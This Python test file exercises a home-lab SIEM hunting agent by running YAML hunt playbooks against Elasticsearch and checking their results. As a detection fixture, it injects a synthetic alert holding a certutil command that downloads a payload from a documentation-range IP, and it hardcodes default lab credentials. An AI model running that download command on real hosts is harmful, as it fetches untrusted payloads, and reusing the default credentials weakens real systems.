"""
test_day30.py — Week 6 review: full hunting-agent test pass.

Mirrors the test_day24.py / test_day29.py pattern already used in this
project. Drop this into ~/elastic/langgraph/ alongside those files.

What it does:
  1. Loads + runs every registered YAML hunt playbook (tools/hunt_loader.py)
     against whatever is currently in Elasticsearch.
  2. Verifies every result matches the Day 27 output contract, even for
     zero-finding hunts.
  3. Prints each Gemini-generated hunt_summary and flags ones that look
     too short / too generic to be "readable and actionable."
  4. Injects one synthetic LOLBin true-positive event, re-runs just the
     `lolbins_execution` (Hunt 3) playbook, and checks that it escalates.
  5. Pulls the latest siem-hunt-results docs so you can paste real numbers
     into docs/hunt-test-results.md.

IMPORTANT — read before running:
  Per the Day 29 notes in project.md, `summarize_hunt_findings()`,
  `write_hunt_result_to_es()`, and `escalate_hunt_to_triage()` were wired
  into `hunting_agent.py`'s `run_hunt()` (the 2-playbook Day 26 engine)
  but NOT into `hunt_loader.py`'s `run_yaml_hunt()` (the engine that runs
  the real 5/6 hunts, including Hunt 3). That's a tracked P1 backlog item.

  Step 4 below (the LOLBin escalation check) will only actually reach the
  triage agent once you've added those same three calls to run_yaml_hunt().
  See the patch note in the README block at the bottom of this file.

Usage:
    cd ~/elastic/langgraph && python3 test_day30.py
"""

import sys
from datetime import datetime, timezone

import requests

from tools.hunt_loader import load_hunt_playbooks, run_all_yaml_hunts, run_yaml_hunt
from tools.elastic_tools import _post

# Same local-lab creds documented throughout project.md — used only for the
# DELETE call below, since _post() doesn't expose DELETE.
ES_URL = "http://localhost:9201"
ES_AUTH = ("elastic", "changeme")

try:
    from tools.elastic_tools import get_recent_hunt_results
except ImportError:
    get_recent_hunt_results = None  # added Day 29 — fine if missing/renamed

REQUIRED_KEYS = {
    "threats_found", "findings", "hunt_summary",
    "escalate", "hunt_name", "mitre_technique", "hypothesis",
}

ACTIONABLE_HINTS = ("recommend", "review", "investigate", "monitor", "no action", "escalate")


def check_contract(result, name):
    missing = REQUIRED_KEYS - result.keys()
    if missing:
        print(f"  [FAIL] {name}: missing keys {missing}")
        return False
    print(f"  [PASS] {name}: output contract OK")
    return True


def check_summary_quality(result, name):
    summary = (result.get("hunt_summary") or "").strip()
    print(f"  summary: {summary[:160]}{'...' if len(summary) > 160 else ''}")
    if len(summary) < 20:
        print(f"  [WARN] {name}: summary looks too short to be useful")
    if not any(kw in summary.lower() for kw in ACTIONABLE_HINTS):
        print(f"  [WARN] {name}: no clear next-step language — may just be the fallback template")
    if "[Gemini unavailable" in summary or "Gemini unavailable" in summary:
        print(f"  [NOTE] {name}: Gemini was down for this run (same 503 pattern as Day 24/29) — fallback text used")


def step_1_and_2():
    print("=== STEP 1+2: run every registered hunt, verify each produces a result ===\n")
    playbooks = load_hunt_playbooks()
    print(f"Loaded {len(playbooks)} playbooks: {[p['hunt_name'] for p in playbooks]}\n")

    results = run_all_yaml_hunts()
    all_ok = True
    for r in results:
        name = r.get("hunt_name", "UNKNOWN")
        print(f"- {name}")
        all_ok = check_contract(r, name) and all_ok
        print(f"    threats_found={r.get('threats_found')}  "
              f"escalate={r.get('escalate')}  mitre={r.get('mitre_technique')}")
    print()
    return results, all_ok


def step_3(results):
    print("=== STEP 3: verify summaries are readable / actionable ===\n")
    for r in results:
        check_summary_quality(r, r.get("hunt_name", "UNKNOWN"))
    print()


def inject_lolbin_true_positive():
    """
    Injects one synthetic Wazuh-style alert simulating a classic LOLBin
    pattern (certutil used to download + decode a payload), matching
    hunts/hunt_lolbins.yml's real elastic_query (confirmed from the actual
    file: matches on data.command / data.win.eventdata.image wildcards for
    certutil/bitsadmin/mshta/regsvr32).

    NOTE — environment gap (flagged in hunt_lolbins.yml itself, not
    invented here): this hunt's real-world matching fields
    (data.win.eventdata.image) are Windows/Sysmon fields. The only agent in
    this project (agent1) is Linux with no process-execution auditing, so
    in real production traffic this hunt will always return 0 — that's a
    permanent gap, not a bug. This synthetic doc still exercises the query
    logic end-to-end via data.command, independent of that gap.
    """
    index = "logs-wazuh.alerts-day30test"
    doc = {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "agent": {"name": "agent1"},
        "rule": {
            "id": "100099",
            "level": 12,
            "description": ("Process execution: certutil.exe -urlcache -split -f "
                             "http://203.0.113.50/payload.b64 C:\\Windows\\Temp\\p.b64"),
            "groups": ["windows", "lolbin", "process_execution"],
        },
        "data": {
            "srcip": "203.0.113.50",
            "dstuser": "svc_backup",
            "command": "certutil.exe -urlcache -split -f http://203.0.113.50/payload.b64",
        },
    }
    resp = _post(f"{index}/_doc?refresh=true", doc)
    print(f"  injected synthetic LOLBin event into '{index}' (refresh=true): {resp.get('result', resp)}")
    return index


def step_4():
    print("=== STEP 4: simulate Hunt 3 (lolbins_execution) true positive ===\n")
    test_index = inject_lolbin_true_positive()

    playbooks = load_hunt_playbooks()
    lolbin_pb = next((p for p in playbooks if p["hunt_name"] == "lolbins_execution"), None)
    if not lolbin_pb:
        print("  [FAIL] could not find a playbook named 'lolbins_execution' — check hunts/ directory naming")
        return None

    result = run_yaml_hunt(lolbin_pb)
    print(f"  threats_found={result['threats_found']}  escalate={result['escalate']}")
    print(f"  summary: {result.get('hunt_summary')}")

    if result["threats_found"] == 0:
        print("  [WARN] still no match after the refresh fix. Since the query and")
        print("         injected doc both target data.command:*certutil*, check:")
        print("         1. is data.command actually mapped as keyword/text (not e.g. long)?")
        print("         2. run the query manually via curl to rule out a syntax issue:")
        print(f"            curl -s -u elastic:changeme {ES_URL}/{test_index}/_search ...")
    elif not result["escalate"]:
        print("  [WARN] hunt matched the event but escalate=False — check finding_threshold in the YAML.")
    else:
        print("  [PASS] synthetic LOLBin event detected and flagged for escalation.")
        print("  -> if run_yaml_hunt() has the Step 0 patch applied, this call also just")
        print("     wrote to siem-hunt-results and invoked escalate_hunt_to_triage().")
        print("     Check your terminal / pipeline logs for the synthetic alert reaching")
        print("     coordination_agent / triage_agent, same as the Day 29 test verified.")

    print(f"\n  cleaning up synthetic test data stream '{test_index}'...")
    try:
        resp = requests.delete(f"{ES_URL}/_data_stream/{test_index}", auth=ES_AUTH, timeout=10)
        print(f"  DELETE _data_stream/{test_index} -> {resp.status_code} {resp.text.strip()[:150]}")
    except Exception as e:
        print(f"  [WARN] auto-cleanup failed ({e}) — clean up manually:")
        print(f"  curl -s -u elastic:changeme -X DELETE http://localhost:9201/_data_stream/{test_index}")
    return result


def show_recent_hunt_results(n=10):
    print(f"=== Recent siem-hunt-results entries (latest {n}) ===\n")
    if get_recent_hunt_results is None:
        print("  get_recent_hunt_results() not found — skipping (check tools/elastic_tools.py)")
        return
    try:
        recent = get_recent_hunt_results(n)
    except Exception as e:
        print(f"  could not fetch recent hunt results: {e}")
        return

    # get_recent_hunt_results() appears to return the raw ES _search response
    # (top-level keys took/timed_out/_shards/hits) rather than parsed docs.
    # Unwrap it here instead of assuming a clean list — fix the real function
    # in tools/elastic_tools.py when you get a chance (it should return
    # [hit["_source"] for hit in resp["hits"]["hits"]]).
    if isinstance(recent, dict) and "hits" in recent:
        hits = recent.get("hits", {}).get("hits", [])
        docs = [h.get("_source", h) for h in hits]
    elif isinstance(recent, list):
        docs = recent
    else:
        docs = [recent]

    if not docs:
        print("  (empty) — if you expected entries here, the Step 0 patch to")
        print("  run_yaml_hunt() (write_hunt_result_to_es call) likely isn't applied yet.")
        return
    for doc in docs:
        if isinstance(doc, dict):
            print(f"  - {doc.get('hunt_name')}: findings={doc.get('findings_count')} "
                  f"escalated={doc.get('escalated')} @ {doc.get('timestamp')}")
        else:
            print(f"  - (unexpected shape, raw value): {doc!r}")


if __name__ == "__main__":
    results, contract_ok = step_1_and_2()
    step_3(results)
    lolbin_result = step_4()
    print()
    show_recent_hunt_results()

    print("\n=== SUMMARY ===")
    print(f"Output contract across all hunts : {'PASS' if contract_ok else 'FAIL — see [FAIL] lines above'}")
    if lolbin_result:
        passed = bool(lolbin_result["threats_found"]) and lolbin_result["escalate"]
        print(f"Hunt 3 true-positive simulation   : {'PASS' if passed else 'NEEDS ATTENTION — see [WARN] lines above'}")
    sys.exit(0)
